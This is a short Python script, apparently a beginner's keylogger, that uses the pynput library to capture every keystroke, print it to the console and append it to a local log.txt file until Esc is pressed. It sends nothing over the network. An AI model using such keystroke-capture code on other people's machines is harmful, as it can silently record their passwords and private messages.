import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []
def on_press(key):
    write_file(key)
def write_file(key):
    with open("log.txt", "a") as file:
        k = str(key).replace("'","")
        print("{0} pressed".format(k))
        if k.find("space") > 0:
            file.write('\n')
        elif len(k) > 1:
            file.write(" " + k[4::] + " ")
        else: 
            file.write(k)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()